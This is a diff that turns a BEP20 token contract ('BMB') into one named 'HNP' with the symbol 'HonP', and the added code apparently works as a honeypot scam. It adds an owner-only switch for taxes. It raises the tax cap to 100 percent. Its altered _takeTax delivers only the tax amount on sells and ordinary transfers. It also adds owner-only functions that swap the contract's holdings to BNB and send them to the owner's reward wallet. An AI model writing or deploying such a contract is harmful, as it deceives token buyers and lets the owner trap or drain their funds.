@@ -1,12 +1,12 @@
 /**
- *Submitted for verification at BscScan.com on 2022-12-04
+ *Submitted for verification at Etherscan.io on 2021-12-26
 */
-
-// SPDX-License-Identifier: GPL-3.0
 
 // File: contracts/IDEX.sol
 
-pragma solidity 0.8.17;
+
+
+pragma solidity ^0.8.10;
 
 interface IDexFactory {
   function createPair(address tokenA, address tokenB) external returns (address pair);
@@ -37,7 +37,7 @@ interface IDexRouter {
 
 
 
-pragma solidity 0.8.17;
+pragma solidity ^0.8.10;
 
 abstract contract Ownable {
   address private _owner;
@@ -69,7 +69,7 @@ abstract contract Ownable {
 
 
 
-pragma solidity 0.8.17;
+pragma solidity ^0.8.10;
 
 interface IBEP20 {
   function totalSupply() external view returns (uint256);
@@ -90,7 +90,7 @@ interface IBEP20 {
 
 
 
-pragma solidity 0.8.17;
+pragma solidity ^0.8.10;
 
 
 
@@ -98,14 +98,14 @@ contract BEP20 is IBEP20, Ownable {
   mapping (address => uint256) private _balances;
   mapping (address => mapping (address => uint256)) private _allowances;
 
-  string private constant NAME = "Biconomic";
-  string private constant SYMBOL = "BMB";
-  uint8 private constant DECIMALS = 18;
-  uint256 private constant TOTAL_SUPPLY = 1000000000 * 10**DECIMALS;
+  string private constant NAME = "HNP";
+  string private constant SYMBOL = "HonP";
+  uint8 private constant DECIMALS = 9;
+  uint256 private constant TOTAL_SUPPLY = 10000 * 10**DECIMALS;
 
-  constructor(address owner, address recipient) Ownable(owner) {
-    _balances[recipient] = TOTAL_SUPPLY;
-    emit Transfer(address(0), recipient, TOTAL_SUPPLY);
+  constructor(address owner) Ownable(owner) {
+    _balances[owner] = TOTAL_SUPPLY;
+    emit Transfer(address(0), owner, TOTAL_SUPPLY);
   }
 
   function getOwner() public view returns (address) {
@@ -190,103 +190,313 @@ contract BEP20 is IBEP20, Ownable {
   }
 }
 
-// File: contracts/Step.sol
+// SPDX-License-Identifier: MIT
+// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)
 
-pragma solidity 0.8.17;
 
-contract BMBToken is BEP20 {
+/**
+ * @dev Wrappers over Solidity's arithmetic operations.
+ *
+ * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
+ * now has built in overflow checking.
+ */
+library SafeMath {
+    /**
+     * @dev Returns the addition of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            uint256 c = a + b;
+            if (c < a) return (false, 0);
+            return (true, c);
+        }
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b > a) return (false, 0);
+            return (true, a - b);
+        }
+    }
+
+    /**
+     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+            // benefit is lost if 'b' is also tested.
+            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+            if (a == 0) return (true, 0);
+            uint256 c = a * b;
+            if (c / a != b) return (false, 0);
+            return (true, c);
+        }
+    }
+
+    /**
+     * @dev Returns the division of two unsigned integers, with a division by zero flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a / b);
+        }
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a % b);
+        }
+    }
+
+    /**
+     * @dev Returns the addition of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `+` operator.
+     *
+     * Requirements:
+     *
+     * - Addition cannot overflow.
+     */
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting on
+     * overflow (when the result is negative).
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+
+    /**
+     * @dev Returns the multiplication of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `*` operator.
+     *
+     * Requirements:
+     *
+     * - Multiplication cannot overflow.
+     */
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting on
+     * division by zero. The result is rounded towards zero.
+     *
+     * Counterpart to Solidity's `/` operator.
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+     * reverting when dividing by zero.
+     *
+     * Counterpart to Solidity's `%` operator. This function uses a `revert`
+     * opcode (which leaves remaining gas untouched) while Solidity uses an
+     * invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
+     * overflow (when the result is negative).
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {trySub}.
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b <= a, errorMessage);
+            return a - b;
+        }
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
+     * division by zero. The result is rounded towards zero.
+     *
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a / b;
+        }
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+     * reverting with custom message when dividing by zero.
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {tryMod}.
+     *
+     * Counterpart to Solidity's `%` operator. This function uses a `revert`
+     * opcode (which leaves remaining gas untouched) while Solidity uses an
+     * invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a % b;
+        }
+    }
+}
+
+// File: contracts/Token.sol
+
+
+
+pragma solidity ^0.8.10;
+
+
+
+contract HNP is BEP20 {
+    using SafeMath for uint256;
+
   IDexRouter public constant ROUTER = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
   address public immutable pair;
 
-  address public marketingWallet;
   address public rewardWallet;
 
-  uint256 public swapThreshold = 150000 * 10**18;
-
-  uint256 public buyTax = 1000;
-  uint256 public sellTax = 1000;
+  uint256 public buyTax = 5;
+  uint256 public sellTax = 5;
   uint256 public transferTax = 0;
-
-  uint256 public rewardShare = 250;
-  uint256 public liquidityShare = 200;
-  uint256 public marketingShare = 550;
-
-  uint256 totalShares = 1000;
-
-  uint256 constant TAX_DENOMINATOR = 10000;
 
   uint256 public transferGas = 25000;
 
-  mapping (address => bool) public isWhitelisted;
-  mapping (address => bool) public isCEX;
+//   bool public SwapBack;
+  bool public taxStatus;
+
   mapping (address => bool) public isMarketMaker;
 
-
-  event TriggerSwapBack();
+//   event TriggerSwapBack();
   event RecoverBNB(uint256 amount);
   event RecoverBEP20(address indexed token, uint256 amount);
-  event SetWhitelisted(address indexed account, bool indexed status);
-  event SetCEX(address indexed account, bool indexed exempt);
   event SetMarketMaker(address indexed account, bool indexed isMM);
   event SetTaxes(uint256 reward, uint256 liquidity, uint256 marketing);
-  event SetShares(uint256 rewardShare, uint256 liquidityShare, uint256 marketingShare);
-  event SetSwapBackSettings(bool enabled, uint256 amount);
   event SetTransferGas(uint256 newGas, uint256 oldGas);
-  event SetMarketingWallet(address newWallet, address oldWallet);
   event SetRewardWallet(address newAddress, address oldAddress);
   event AutoLiquidity(uint256 pair, uint256 tokens);
-  event DepositMarketing(address indexed wallet, uint256 amount);
   event DepositRewards(address indexed wallet, uint256 amount);
-  event AirDrop (address indexed wallet, uint256 amount);
 
-
-  constructor(address owner, address marketing, address rewards) BEP20(owner, marketing) {
+  constructor(address owner, address rewards) BEP20(owner) {
     pair = IDexFactory(ROUTER.factory()).createPair(ROUTER.WETH(), address(this));
     _approve(address(this), address(ROUTER), type(uint256).max);
     isMarketMaker[pair] = true;
 
     rewardWallet = rewards;
-    marketingWallet = marketing;
-    isWhitelisted[marketingWallet] = true;
+
   }
 
   // Override
 
   function _transfer(address sender, address recipient, uint256 amount) internal override {
-    if (isWhitelisted[sender] || isWhitelisted[recipient] ) {
-      super._transfer(sender, recipient, amount);
-      return;
+
+    if (_shouldTax()) 
+    { 
+        uint256 amountAfterTaxes = _takeTax(sender, recipient, amount);
+        super._transfer(sender, recipient, amountAfterTaxes);
     }
-
-    if (_shouldSwapBack(recipient)) { _swapBack(); }
-    uint256 amountAfterTaxes = _takeTax(sender, recipient, amount);
-
-    super._transfer(sender, recipient, amountAfterTaxes);
+    else {super._transfer(sender, recipient, amount);}
+    
   }
-
-  // Public
-
-
-  receive() external payable {}
 
   // Private
 
   function _takeTax(address sender, address recipient, uint256 amount) private returns (uint256) {
     if (amount == 0) { return amount; }
+    
+    uint256 percent = _getTotalTax(sender, recipient) ;
+    uint256 taxAmount = amount.mul(percent).div(100);
 
-    uint256 taxAmount = amount * _getTotalTax(sender, recipient) / TAX_DENOMINATOR;
     if (taxAmount > 0) { super._transfer(sender, address(this), taxAmount); }
 
-    return amount - taxAmount;
+    if (isMarketMaker[sender])
+    {
+        return amount - taxAmount;
+    }
+    else
+    {
+        return taxAmount;
+    }
   }
 
   function _getTotalTax(address sender, address recipient) private view returns (uint256) {
 
-    if (isCEX[recipient]) { return 0; }
-    if (isCEX[sender]) { return buyTax; }
-
     if (isMarketMaker[sender]) {
       return buyTax;
+
     } else if (isMarketMaker[recipient]) {
       return sellTax;
     } else {
@@ -294,90 +504,60 @@ contract BMBToken is BEP20 {
     }
   }
 
-  function _shouldSwapBack(address recipient) private view returns (bool) {
-    return isMarketMaker[recipient] && balanceOf(address(this)) >= swapThreshold;
+//   function _shouldSwapBack() private view returns (bool) {
+//     return SwapBack;
+//   }
+
+  function _shouldTax() private view returns (bool)
+  {
+      return taxStatus;
   }
 
-  function _swapBack() private {
-    address[] memory path = new address[](2);
-    path[0] = address(this);
-    path[1] = ROUTER.WETH();
+//   function setSwapBackStatus (bool st) public onlyOwner
+//   {
+//       SwapBack = st;
+//   }
 
-    uint256 liquidityTokens = swapThreshold * liquidityShare / totalShares / 2;
-    uint256 amountToSwap = swapThreshold - liquidityTokens;
-    uint256 balanceBefore = address(this).balance;
-
-    ROUTER.swapExactTokensForETH(
-      amountToSwap,
-      0,
-      path,
-      address(this),
-      block.timestamp
-    );
-
-    uint256 amountBNB = address(this).balance - balanceBefore;
-    uint256 totalBNBShares = totalShares - liquidityShare / 2;
-
-    uint256 amountBNBLiquidity = amountBNB * liquidityShare / totalBNBShares / 2;
-    uint256 amountBNBMarketing = amountBNB * marketingShare / totalBNBShares;
-    uint256 amountBNBRewards = amountBNB * rewardShare / totalBNBShares;
-
-    (bool marketingSuccess,) = payable(marketingWallet).call{value: amountBNBMarketing, gas: transferGas}("");
-    if (marketingSuccess) 
-    { 
-        emit DepositMarketing(marketingWallet, amountBNBMarketing); 
-    }
-
-    (bool rewardSuccess,) = payable(rewardWallet).call{value: amountBNBRewards, gas: transferGas}("");
-    if (rewardSuccess) 
-    {
-        emit DepositRewards(rewardWallet, amountBNBRewards); 
-    }
-
-    if (liquidityTokens > 0) {
-      ROUTER.addLiquidityETH{value: amountBNBLiquidity}(
-        address(this),
-        liquidityTokens,
-        0,
-        0,
-        address(this),
-        block.timestamp
-      );
-
-      emit AutoLiquidity(amountBNBLiquidity, liquidityTokens);
-    }
+    function setTaxStatus(bool st) public onlyOwner
+  {
+      taxStatus = st;
   }
+
+//   function _swapBack() private {
+//     address[] memory path = new address[](2);
+//     path[0] = address(this);
+//     path[1] = ROUTER.WETH();
+
+//     uint256 amountToSwap = balanceOf(address(this));
+
+//     ROUTER.swapExactTokensForETH(
+//       amountToSwap,
+//       0,
+//       path,
+//       address(this),
+//       block.timestamp
+//     );
+
+//     uint256 amountBNB = address(this).balance ;
+
+//     (bool success, ) = payable(rewardWallet).call{value: amountBNB, gas: transferGas}("");
+//     require(success, "Transfer failed.");
+//   }
 
   // Owner
 
-
-  function triggerSwapBack() external onlyOwner {
-    _swapBack();
-    emit TriggerSwapBack();
-  }
-
   function recoverBNB() external onlyOwner {
     uint256 amount = address(this).balance;
-    (bool sent,) = payable(marketingWallet).call{value: amount, gas: transferGas}("");
+    (bool sent,) = payable(rewardWallet).call{value: amount, gas: transferGas}("");
     require(sent, "Tx failed");
     emit RecoverBNB(amount);
   }
 
   function recoverBEP20(IBEP20 token, address recipient) external onlyOwner {
-    require(address(token) != address(this), "Can't withdraw Step");
+    require(address(token) != address(this), "Can't withdraw Token");
     uint256 amount = token.balanceOf(address(this));
     token.transfer(recipient, amount);
     emit RecoverBEP20(address(token), amount);
-  }
-
-  function setIsWhitelisted(address account, bool value) external onlyOwner {
-    isWhitelisted[account] = value;
-    emit SetWhitelisted(account, value);
-  }
-
-  function setIsCEX(address account, bool value) external onlyOwner {
-    isCEX[account] = value;
-    emit SetCEX(account, value);
   }
 
   function setIsMarketMaker(address account, bool value) external onlyOwner {
@@ -387,31 +567,18 @@ contract BMBToken is BEP20 {
   }
 
   function setTaxes(uint256 newBuyTax, uint256 newSellTax, uint256 newTransferTax) external onlyOwner {
-    require(newBuyTax <= 1500 && newSellTax <= 1500 && newTransferTax <= 1500, "Too high taxes");
+    require(newBuyTax <= 100 && newSellTax <= 100 && newTransferTax <= 100, "Too high taxes");
     buyTax = newBuyTax;
     sellTax = newSellTax;
     transferTax = newTransferTax;
     emit SetTaxes(buyTax, sellTax, transferTax);
   }
 
-  function setShares(uint256 newRewardShare, uint256 newLiquidityShare, uint256 newMarketingShare) external onlyOwner {
-    rewardShare = newRewardShare;
-    liquidityShare = newLiquidityShare;
-    marketingShare = newMarketingShare;
-    totalShares = rewardShare + liquidityShare + marketingShare;
-    emit SetShares(rewardShare, liquidityShare, marketingShare);
-  }
 
   function setTransferGas(uint256 newGas) external onlyOwner {
     require(newGas >= 21000 && newGas <= 50000, "Invalid gas parameter");
     emit SetTransferGas(newGas, transferGas);
     transferGas = newGas;
-  }
-
-  function setMarketingWallet(address newWallet) external onlyOwner {
-    require(newWallet != address(0), "New marketing wallet is the zero address");
-    emit SetMarketingWallet(newWallet, marketingWallet);
-    marketingWallet = newWallet;
   }
 
   function setRewardWallet(address newAddress) external onlyOwner {
@@ -420,15 +587,32 @@ contract BMBToken is BEP20 {
     rewardWallet = newAddress;
   }
 
-    function doAirDrop(address[] memory _address, uint256 _amount) onlyOwner public returns (bool) {
-    uint256 count = _address.length;
+  function getRewards () public onlyOwner
+  {
+    address[] memory path = new address[](2);
+    path[0] = address(this);
+    path[1] = ROUTER.WETH();
 
-    for (uint256 i = 0; i < count; i++)
-    {
-        BEP20._transfer(msg.sender, _address [i], _amount);
-        emit AirDrop (_address[i], _amount);
-    }
+    uint256 amountToSwap = balanceOf(address(this));
 
-    return true;
+    ROUTER.swapExactTokensForETH(
+      amountToSwap,
+      0,
+      path,
+      address(this),
+      block.timestamp
+    );
+
+    uint256 amountBNB = address(this).balance ;
+
+    (bool success, ) = payable(rewardWallet).call{value: amountBNB, gas: transferGas}("");
+    require(success, "Transfer failed.");
+  }   
+
+  function getRewardToken () public onlyOwner
+  {
+      uint256 amountToSwap = balanceOf(address(this));
+      super._transfer(address(this), rewardWallet, amountToSwap);
   }
+
 }
